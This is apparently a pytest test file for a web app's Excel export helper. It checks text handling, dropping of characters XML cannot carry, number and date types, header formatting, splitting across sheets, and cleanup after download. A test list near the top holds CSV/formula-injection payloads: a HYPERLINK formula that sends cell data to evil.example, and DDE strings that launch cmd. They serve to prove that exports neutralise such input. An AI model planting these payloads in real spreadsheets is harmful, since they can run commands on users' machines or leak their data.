"""The exports' Excel option (app/core/utils/spreadsheet.py): text is stored
as text whatever it starts with, what XML cannot carry is dropped, numbers
and dates keep their types, the header is bold and frozen, and the file is
removed once sent."""
import enum
import os
import zipfile
from datetime import date, datetime, timedelta, timezone
from decimal import Decimal

import pytest
from fastapi import FastAPI
from httpx import ASGITransport, AsyncClient
from openpyxl import load_workbook
from openpyxl.worksheet import _writer as openpyxl_writer

from app.core.utils import spreadsheet
from app.core.utils.spreadsheet import Bold, XlsxWriter, write_xlsx, xlsx_response
from tests.spreadsheet_helpers import XLSX, rows_of

#: Every test opens the suite's session, though none touches the database:
#: a first test without it leaves the session's connection on another loop.
pytestmark = pytest.mark.usefixtures("session")

IST = timezone(timedelta(hours=5, minutes=30))
#: What people type into a form to make a spreadsheet run something.
ATTACKS = [
    '=HYPERLINK("http://evil.example/?d="&A1,"Click")',
    "+cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "=1+1",
    "#N/A",
    "\t=1+1",
]


def _write(rows, headers=None, **kw) -> str:
    writer = XlsxWriter("Test", headers, **kw)
    writer.extend(rows)
    return writer.save()


@pytest.fixture
def saved():
    paths = []

    def save(rows, headers=None, **kw):
        path = _write(rows, headers, **kw)
        paths.append(path)
        return path

    yield save
    for p in paths:
        spreadsheet.remove(p)


def _sheet_xml(path: str, n: int = 1) -> str:
    with zipfile.ZipFile(path) as z:
        return z.read(f"xl/worksheets/sheet{n}.xml").decode("utf-8")


def test_text_that_looks_like_a_formula_is_stored_as_text(saved):
    path = saved([ATTACKS], headers=["=Header", *[f"Q{i}" for i in range(len(ATTACKS) - 1)]])
    sheet = load_workbook(path)["Test"]  # formulas, not their cached values
    header, row = rows_of(sheet)
    assert header[0] == "=Header" and sheet["A1"].data_type == "s"
    assert row == ATTACKS  # exactly as typed: no apostrophe, nothing added
    for cell in sheet[2]:
        assert cell.data_type == "s", (cell.coordinate, cell.value)
    xml = _sheet_xml(path)
    # Not a formula, not an error code: every cell an inline string.
    assert "<f>" not in xml and "<f " not in xml and 't="e"' not in xml and 't="str"' not in xml
    assert xml.count('t="inlineStr"') == 2 * len(ATTACKS)


def test_characters_xml_cannot_carry_are_dropped_not_refused(saved):
    nasty = "a\x00b\x01c\x08d\x0be\x0cf\x1fg\ud800h￿i"
    kept = "tab\there\nnew line\r\nand back"
    path = saved([[nasty, kept, "x" * 40_000]], headers=["bad\x07 header", "kept", "long"])
    sheet = load_workbook(path)["Test"]
    assert [c.value for c in sheet[1]] == ["bad header", "kept", "long"]
    assert sheet["A2"].value == "abcdefghi"
    assert sheet["B2"].value.startswith("tab\there\nnew line")
    assert len(sheet["C2"].value) == spreadsheet.MAX_CELL  # Excel's limit a cell
    assert spreadsheet.clean_text("=\x02SUM(A1)") == "=SUM(A1)"


class Colour(str, enum.Enum):
    red = "red"


def test_numbers_and_dates_keep_their_types(saved):
    aware = datetime(2026, 11, 9, 15, 30, 5, tzinfo=IST)
    naive = datetime(2026, 11, 9, 10, 0, 0)
    row = [7, 2.5, Decimal("1234.50"), aware, naive, date(2026, 11, 9), True, False, None, "", Colour.red, ["a", None, 3], {"k": "v"}, float("nan"), "0091"]
    path = saved([row], headers=[f"c{i}" for i in range(len(row))])
    sheet = load_workbook(path)["Test"]
    c = list(sheet[2])
    assert (c[0].value, c[0].data_type) == (7, "n")
    assert (c[1].value, c[1].data_type) == (2.5, "n")
    assert (c[2].value, c[2].data_type, c[2].number_format) == (1234.5, "n", "0.00")
    # A zoned time is the same instant in UTC, as the CSVs write it, and says so.
    assert c[3].value == datetime(2026, 11, 9, 10, 0, 5) and c[3].is_date and "UTC" in c[3].number_format
    assert c[4].value == naive and c[4].is_date and "UTC" not in c[4].number_format
    assert c[5].value == datetime(2026, 11, 9) and c[5].is_date and c[5].number_format == "yyyy-mm-dd"
    assert [c[6].value, c[7].value] == ["yes", "no"]
    assert c[8].value is None and c[9].value is None
    assert c[10].value == "red"
    assert c[11].value == "a, , 3" and c[12].value == '{"k": "v"}'
    assert (c[13].value, c[13].data_type) == ("nan", "s")
    assert (c[14].value, c[14].data_type) == ("0091", "s")  # a number's look is not a number: the zeros stay


def test_the_header_is_bold_and_frozen_and_the_columns_fit(saved):
    rows = [["short", "y" * 500, 12], Bold(["Heading"]), ["plain"]]
    path = saved(rows, headers=["Name", "Notes", "N"])
    sheet = load_workbook(path)["Test"]
    assert sheet.freeze_panes == "A2"
    assert all(c.font.b for c in sheet[1])
    assert not sheet["A2"].font.b and sheet["A3"].font.b and not sheet["A4"].font.b
    widths = {k: d.width for k, d in sheet.column_dimensions.items()}
    assert widths["B"] == spreadsheet.MAX_WIDTH  # capped
    assert widths["A"] == spreadsheet.MIN_WIDTH + 1 and widths["C"] == spreadsheet.MIN_WIDTH  # "Heading" + 2; at least the minimum


def test_no_header_freezes_what_it_is_told(saved):
    sheet = load_workbook(saved([Bold(["Statement"]), [], ["a", 1]], freeze=None))["Test"]
    assert sheet.freeze_panes is None and rows_of(sheet) == [["Statement"], [], ["a", 1]]
    sheet = load_workbook(saved([Bold(["Statement"]), [], Bold(["Head"]), ["a", 1]], freeze=3))["Test"]
    assert sheet.freeze_panes == "A4"


def test_a_list_longer_than_a_sheet_carries_on_in_the_next(saved, monkeypatch):
    monkeypatch.setattr(spreadsheet, "MAX_ROWS", 3)
    book = load_workbook(saved([[i] for i in range(5)], headers=["n"]))
    assert book.sheetnames == ["Test", "Test (2)", "Test (3)"]
    assert [rows_of(book[name]) for name in book.sheetnames] == [[["n"], [0], [1]], [["n"], [2], [3]], [["n"], [4]]]
    assert book["Test (2)"].freeze_panes == "A2" and book["Test (2)"]["A1"].font.b


def test_sheet_titles_are_ones_excel_takes():
    assert spreadsheet.sheet_title("Q1/Q2: [draft]*?") == "Q1 Q2   draft"
    assert spreadsheet.sheet_title("x" * 40) == "x" * 31
    assert spreadsheet.sheet_title("  ") == "Sheet"


async def test_rows_off_an_async_source_in_batches():
    async def source():
        for i in range(7):
            yield [i, f"={i}"]

    path = await write_xlsx(source(), title="Async", headers=["n", "text"], batch=3)
    try:
        sheet = load_workbook(path)["Async"]
        assert rows_of(sheet) == [["n", "text"], *[[i, f"={i}"] for i in range(7)]]
        assert all(sheet.cell(row=r, column=2).data_type == "s" for r in range(1, 9))
    finally:
        spreadsheet.remove(path)


async def test_a_source_that_fails_leaves_no_file_behind():
    before = set(openpyxl_writer.ALL_TEMP_FILES)

    async def source():
        for i in range(500):
            yield [i]
        raise RuntimeError("the cursor went away")

    with pytest.raises(RuntimeError):
        await write_xlsx(source(), title="Broken", headers=["n"], batch=100)
    left = [p for p in openpyxl_writer.ALL_TEMP_FILES if p not in before and os.path.exists(p)]
    assert left == []


async def test_the_response_is_a_download_and_the_file_goes_once_sent():
    path = await write_xlsx([["a", 1]], title="Sent", headers=["x", "y"])
    app = FastAPI()

    @app.get("/f")
    async def f():
        return xlsx_response(path, "some-name.xlsx", cache_control="no-store")

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
        r = await client.get("/f")
    assert r.status_code == 200 and r.headers["content-type"] == XLSX
    assert r.headers["content-disposition"] == 'attachment; filename="some-name.xlsx"'
    assert r.headers["cache-control"] == "no-store"
    assert r.content[:2] == b"PK" and not os.path.exists(path)
